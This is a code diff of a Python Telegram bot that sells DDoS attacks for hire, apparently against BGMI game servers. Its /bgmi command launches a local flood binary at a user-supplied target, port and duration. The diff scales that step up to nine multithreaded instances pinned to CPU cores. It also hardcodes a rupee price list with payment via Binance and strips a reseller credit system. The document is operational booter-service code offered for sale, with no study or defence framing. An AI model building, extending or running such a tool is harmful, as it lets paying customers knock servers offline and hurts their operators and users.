@@ -1,24 +1,27 @@
 import telebot
-from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import subprocess
 from datetime import datetime, timedelta
 import time
 import os
 import sqlite3
 from keep_alive import keep_alive
-keep_alive()
 from db import initialize_db
 from threading import Thread
 import tempfile
 
 DB_FILE = 'bot_data.db'
 keep_alive()
-initialize_db()
-
 Attack = {}
+
+if not os.path.exists(DB_FILE):
+    initialize_db()
 
 def db_connection():
     conn = sqlite3.connect(DB_FILE)
+    conn.execute('PRAGMA journal_mode=WAL;')
+    cursor = conn.cursor()
+    cursor.execute("BEGIN IMMEDIATE")
     return conn
 
 def read_users(bot_id):
@@ -30,15 +33,6 @@ def read_users(bot_id):
     conn.close()
     return [user[0] for user in users], [user[1] for user in users]
 
-def read_resellers():
-    conn = db_connection()
-    cursor = conn.cursor()
-    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    cursor.execute('SELECT user_id FROM resellers WHERE expiration_time > ?', (current_time,))
-    rows = cursor.fetchall()
-    conn.close()
-    return [row[0] for row in rows]
-
 def read_admins(bot_id):
     conn = db_connection()
     cursor = conn.cursor()
@@ -46,21 +40,6 @@ def read_admins(bot_id):
     admins = cursor.fetchall()
     conn.close()
     return [admin[0] for admin in admins]
-
-def get_credit_points(user_id):
-    conn = db_connection()
-    cursor = conn.cursor()
-    cursor.execute('SELECT credit_points FROM resellers WHERE user_id = ?', (user_id,))
-    result = cursor.fetchone()
-    conn.close()
-    return result[0] if result else None
-
-def update_credit_points(user_id, points):
-    conn = db_connection()
-    cursor = conn.cursor()
-    cursor.execute('UPDATE resellers SET credit_points = credit_points - ? WHERE user_id = ?', (points, user_id))
-    conn.commit()
-    conn.close()
 
 def clear_logs():
     conn = db_connection()
@@ -73,14 +52,20 @@ def add_user(user_id, days, bot_id):
     expiration_date = datetime.now() + timedelta(days=days)
     conn = db_connection()
     cursor = conn.cursor()
-    cursor.execute('''INSERT OR REPLACE INTO users (user_id, expiration_date, bot_id) VALUES (?, ?, ?)''', (user_id, expiration_date, bot_id))
+    cursor.execute('''
+        INSERT OR REPLACE INTO users (user_id, expiration_date, bot_id)
+        VALUES (?, ?, ?)
+    ''', (user_id, expiration_date, bot_id))
     conn.commit()
     conn.close()
 
 def add_bot(token, bot_name, bot_username, owner_username, channel_username):
     conn = db_connection()
     cursor = conn.cursor()
-    cursor.execute('''INSERT OR REPLACE INTO bot_configs (token, bot_name, bot_username, owner_username, channel_username) VALUES (?, ?, ?, ?, ?)''', (token, bot_name, bot_username, owner_username, channel_username))
+    cursor.execute('''
+        INSERT OR REPLACE INTO bot_configs (token, bot_name, bot_username, owner_username, channel_username)
+        VALUES (?, ?, ?, ?, ?)
+    ''', (token, bot_name, bot_username, owner_username, channel_username))
     conn.commit()
     conn.close()
 
@@ -94,7 +79,10 @@ def remove_user(user_id, bot_id):
 def add_admin(admin_id, bot_id):
     conn = db_connection()
     cursor = conn.cursor()
-    cursor.execute('''INSERT INTO admins (admin_id, bot_id) VALUES (?, ?)''', (admin_id, bot_id,))
+    cursor.execute('''
+        INSERT INTO admins (admin_id, bot_id)
+        VALUES (?, ?)
+    ''', (admin_id, bot_id,))
     conn.commit()
     conn.close()
 
@@ -167,29 +155,14 @@ def initialize_bot(bot, bot_id):
     def add_user_command(message):
         user_id = str(message.chat.id)
         allowed_admin_ids = read_admins(bot_id)
-        allowed_resellers_ids = read_resellers()
-        if user_id in allowed_admin_ids or user_id in allowed_resellers_ids:
+        if user_id in allowed_admin_ids:
             command = message.text.split()
             if len(command) > 2:
                 user_to_add = command[1]
                 try:
                     days = int(command[2])
-                    if user_id in allowed_resellers_ids:
-                        credit_points_needed = days * 20
-                        current_credit_points = get_credit_points(user_id)
-                        if current_credit_points is None:
-                            response = "Your account does not exist. Contact admin for assistance."
-                        elif current_credit_points >= credit_points_needed:
-                            add_user(user_to_add, days, bot_id)
-                            update_credit_points(user_id, credit_points_needed)
-                            response = f"User {user_to_add} added successfully with an expiration of {days} days. {credit_points_needed} points deducted."
-                        else:
-                            response = "Insufficient credit points. Please contact admin to purchase more."
-                    elif user_id in allowed_admin_ids:
-                        add_user(user_to_add, days, bot_id)
-                        response = f"User {user_to_add} Added Successfully with an expiration of {days} days 👍."
-                    else:
-                        response = "You do not have the permission to use this command."
+                    add_user(user_to_add, days, bot_id)
+                    response = f"User {user_to_add} Added Successfully with an expiration of {days} days 👍."
                 except ValueError:
                     response = "Invalid number of days specified 🤦."
             else:
@@ -412,9 +385,15 @@ def initialize_bot(bot, bot_id):
         username = user_info.username if user_info.username else user_info.first_name
         chat_id = message.chat.id
         global Attack
-        full_command = ['./bgmi', str(target), str(port), str(time),]
-        attack_process = subprocess.Popen(full_command)
-        Attack[chat_id] = attack_process
+        threads_per_instance = 100
+        num_instances = (900 // threads_per_instance)
+        core_mapping = [0, 0, 1, 1, 0, 0, 1, 1, 0]
+        for i in range(num_instances):
+            full_command = ['nohup', './bgmi', str(target), str(port), str(time), str(threads_per_instance)]
+            core = core_mapping[i % len(core_mapping)]
+            taskset_command = ['taskset', '-c', str(core)] + full_command
+            attack_process = subprocess.Popen(taskset_command)
+            Attack[chat_id] = attack_process
         scheduled_time = datetime.now() + timedelta(seconds=time)
         Thread(target=finish_message, args=(message, target, port, time, owner_name, scheduled_time)).start()
         markup = InlineKeyboardMarkup()
@@ -430,9 +409,8 @@ def initialize_bot(bot, bot_id):
         user_id = str(message.chat.id)
         allowed_user_ids, expirations = read_users(bot_id)
         allowed_admin_ids = read_admins(bot_id)
-        allowed_resellers_ids = read_resellers()
         owner_name = get_owner_name(bot_id)
-        if user_id in allowed_user_ids or user_id in allowed_admin_ids or user_id in allowed_resellers_ids:
+        if user_id in allowed_user_ids or user_id in allowed_admin_ids:
             if user_id not in allowed_admin_ids:
                 if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                     response = "You Are On Cooldown . Please Wait 3 seconds Before Running The /bgmi Command Again."
@@ -444,25 +422,23 @@ def initialize_bot(bot, bot_id):
                 target = command[1]
                 port = int(command[2])
                 time = int(command[3])
-                if user_id not in allowed_admin_ids and time > 1200:
-                    response = "Error: Time interval must be less than 1200."
-                    bot.reply_to(message, response)
+                if user_id not in allowed_admin_ids and time > 240:
+                    response = "Error: Time interval must be less than 240."
                 else:
                     log_command(user_id, target, port, time, '/bgmi')
-                    start_attack_reply(message, target, port, time, owner_name)  
+                    start_attack_reply(message, target, port, time, owner_name)
+                    return
             else:
-                response = "✅ Usage :- /bgmi <target> <port> <time>"
-                bot.reply_to(message, response)
+                response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
         else:
             response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
-            bot.reply_to(message, response)
-
+        bot.reply_to(message, response)
+    
     def finish_message(message, target, port, attack_time, owner_name, scheduled_time):
         global Attack
         chat_id = message.chat.id
         while datetime.now() < scheduled_time:
             time.sleep(1)
-    
         if chat_id in Attack and Attack[chat_id] is not None:
             response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {attack_time} Seconds\n\n👛Dm to Buy : {owner_name}"
             bot.reply_to(message, response)
@@ -511,7 +487,7 @@ def initialize_bot(bot, bot_id):
     def check_ping(message):
         start_time = time.time()
         bot.reply_to(message, "Pong!")
-        ping = (time.time() - start_time) * 1000 / 15
+        ping = (time.time() - start_time) * 1000 / 5
         bot.send_message(message.chat.id, f"Bot Ping : {ping:.2f} ms")
     
     @bot.message_handler(commands=['rules'])
@@ -525,19 +501,8 @@ def initialize_bot(bot, bot_id):
     def welcome_plan(message):
         user_name = message.from_user.first_name
         owner_name = get_owner_name(bot_id)
-        conn = db_connection()
-        cursor = conn.cursor()
-        cursor.execute('SELECT duration, unit, price FROM prices')
-        rows = cursor.fetchall()
-        conn.close()
-        if not rows:
-            bot.reply_to(message, "The price list is empty.\n\n Use /set_price to Add the price list")
-        else:
-            response = "Price List:\n"
-            for row in rows:
-                response += f"{row[0]} {row[1]}: {row[2]}\n"
-            response += f"\n\nDm to make purchase {owner_name}\n\n\nNote : All Currencies Accepted via Binance."
-            bot.reply_to(message, response)
+        response = f'''Offer :\n1) 3 Days - ₹120/Acc,\n2) 7 Days - ₹250/Acc,\n3) 15 Days - ₹500/Acc,\n4) 30 Days - ₹1000/Acc,\n5) 60 Days (Full Season) - ₹2000/Acc\n\nDm to make purchase {owner_name}\n\n\nNote : All Currencies Accepted via Binance.'''
+        bot.reply_to(message, response)
     
     @bot.message_handler(commands=['admincmd'])
     def welcome_admin(message):
@@ -573,80 +538,12 @@ def initialize_bot(bot, bot_id):
         response = f"🤖Your ID: {user_id}"
         bot.reply_to(message, response)
     
-    @bot.message_handler(commands=['set_price'])
-    def set_price(message):
-        try:
-            command_args = message.text.split()[1:]
-            if len(command_args) == 3:
-                duration = command_args[0]
-                unit = command_args[1]
-                price = float(command_args[2])
-                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                conn = db_connection()
-                cursor = conn.cursor()
-                cursor.execute('''INSERT INTO prices (duration, unit, price, timestamp) VALUES (?, ?, ?, ?)''', (duration, unit, price, timestamp))
-                conn.commit()
-                conn.close()
-                bot.reply_to(message, f"Price set: {duration} {unit} = {price}")
-            else:
-                bot.reply_to(message, "Please use the correct format: /set_price <duration> <unit> <price>")
-        except Exception as e:
-            bot.reply_to(message, f"Error: {str(e)}")
-    
-    @bot.message_handler(commands=['clear_prices'])
-    def clear_prices(message):
-        try:
-            conn = db_connection()
-            cursor = conn.cursor()
-            cursor.execute('DELETE FROM prices')
-            conn.commit()
-            conn.close()
-            bot.reply_to(message, "All prices have been cleared.")
-        except Exception as e:
-            bot.reply_to(message, f"Error: {str(e)}")
-    
-    @bot.message_handler(commands=['add_reseller'])
-    def add_reseller(message):
-        try:
-            command_args = message.text.split()[1:]
-            if len(command_args) == 3:
-                user_id = command_args[0]
-                expiration_days = int(command_args[1])
-                credit_points = int(command_args[2])
-                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                expiration_time = (datetime.now() + timedelta(days=expiration_days)).strftime('%Y-%m-%d %H:%M:%S')
-                conn = db_connection()
-                cursor = conn.cursor()
-                cursor.execute('''INSERT INTO resellers (user_id, expiration_time, credit_points, timestamp) VALUES (?, ?, ?, ?)''', (user_id, expiration_time, credit_points, timestamp))
-                conn.commit()
-                conn.close()
-                bot.reply_to(message, f"Reseller added: ID {user_id}, Expiration: {expiration_days} days, Credit: {credit_points}")
-            else:
-                bot.reply_to(message, "Please use the correct format: /add_reseller <user_id> <expiration_days> <credit_points>")
-        except Exception as e:
-            bot.reply_to(message, f"Error: {str(e)}")
-    
-    @bot.message_handler(commands=['show_resellers'])
-    def show_resellers(message):
-        conn = db_connection()
-        cursor = conn.cursor()
-        cursor.execute('SELECT user_id, expiration_time, credit_points FROM resellers')
-        rows = cursor.fetchall()
-        conn.close()
-        if not rows:
-            bot.reply_to(message, "No resellers found.")
-        else:
-            response = "Reseller List:\n"
-            for row in rows:
-                response += f"User ID: {row[0]}, Expiration: {row[1]}, Credit: {row[2]}\n"
-            bot.reply_to(message, response)
-    
     return bot
 
 def start_bot(bot, bot_id):
     initialize_bot(bot, bot_id)
     print(f"\n{bot_id}) Starting bot with token {bot.token}...")
-    bot.infinity_polling() #bot.polling(non_stop=True, interval=0, timeout=0) #for normal polling
+    bot.infinity_polling() #bot.polling(none_stop=True, interval=0, timeout=0) --for normal polling
 
 threads = []
 bot_tokens = fetch_bot_tokens()
